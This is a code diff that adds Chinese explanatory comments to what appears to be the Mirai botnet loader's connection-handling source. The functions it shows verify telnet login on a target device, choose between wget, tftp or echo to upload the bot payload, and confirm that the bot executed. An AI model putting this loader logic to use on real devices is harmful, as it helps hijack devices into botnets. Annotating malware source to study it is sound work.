@@ -233,22 +233,26 @@ int connection_consume_prompt(struct connection *conn)
         return prompt_ending;
 }
 
+//验证登录是否成功
 int connection_consume_verify_login(struct connection *conn)
 {
+    //"ECCHI: applet not found"  
     int prompt_ending = util_memsearch(conn->rdbuf, conn->rdbuf_pos, TOKEN_RESPONSE, strlen(TOKEN_RESPONSE));
 
     if (prompt_ending == -1)
         return 0;
     else
-        return prompt_ending;
+        return prompt_ending;//登录成功
 }
 
+//验证ps命令的输出
 int connection_consume_psoutput(struct connection *conn)
 {
     int offset;
     char *start = conn->rdbuf;
     int i, ii;
 
+    //
     offset = util_memsearch(conn->rdbuf, conn->rdbuf_pos, TOKEN_RESPONSE, strlen(TOKEN_RESPONSE));
 
     for (i = 0; i < (offset == -1 ? conn->rdbuf_pos : offset); i++)
@@ -453,8 +457,11 @@ int connection_consume_written_dirs(struct connection *conn)
     return end_pos;
 }
 
+
+//copy命令和chmod命令是否成功执行
 int connection_consume_copy_op(struct connection *conn)
 {
+    //查找有没有TOKEN_RESPONSE
     int offset = util_memsearch(conn->rdbuf, conn->rdbuf_pos, TOKEN_RESPONSE, strlen(TOKEN_RESPONSE));
 
     if (offset == -1)
@@ -553,6 +560,7 @@ int connection_consume_arm_subtype(struct connection *conn)
     return offset;
 }
 
+//判断采用哪种方式上传
 int connection_consume_upload_methods(struct connection *conn)
 {
     int offset = util_memsearch(conn->rdbuf, conn->rdbuf_pos, TOKEN_RESPONSE, strlen(TOKEN_RESPONSE));
@@ -560,12 +568,12 @@ int connection_consume_upload_methods(struct connection *conn)
     if (offset == -1)
         return 0;
 
-    if (util_memsearch(conn->rdbuf, offset, "wget: applet not found", 22) == -1)
+    if (util_memsearch(conn->rdbuf, offset, "wget: applet not found", 22) == -1)//优先选择wget方式
         conn->info.upload_method = UPLOAD_WGET;
-    else if (util_memsearch(conn->rdbuf, offset, "tftp: applet not found", 22) == -1)
+    else if (util_memsearch(conn->rdbuf, offset, "tftp: applet not found", 22) == -1)//其次选择tftp方式
         conn->info.upload_method = UPLOAD_TFTP;
     else
-        conn->info.upload_method = UPLOAD_ECHO;
+        conn->info.upload_method = UPLOAD_ECHO;//如果没有wget和tftp，则选择echo方式
 
     return offset;
 }
@@ -627,6 +635,7 @@ int connection_upload_tftp(struct connection *conn)
     return offset;
 }
 
+//检查是否成功执行bot程序
 int connection_verify_payload(struct connection *conn)
 {
     int offset = util_memsearch(conn->rdbuf, conn->rdbuf_pos, EXEC_RESPONSE, strlen(EXEC_RESPONSE));
@@ -634,7 +643,7 @@ int connection_verify_payload(struct connection *conn)
     if (offset == -1)
         return 0;
 
-    if (util_memsearch(conn->rdbuf, offset, "listening tun0", 14) == -1)
+    if (util_memsearch(conn->rdbuf, offset, "listening tun0", 14) == -1)//为何有"listening tun0"就表示执行不成功？？？
         return offset;
     else
         return 255 + offset;
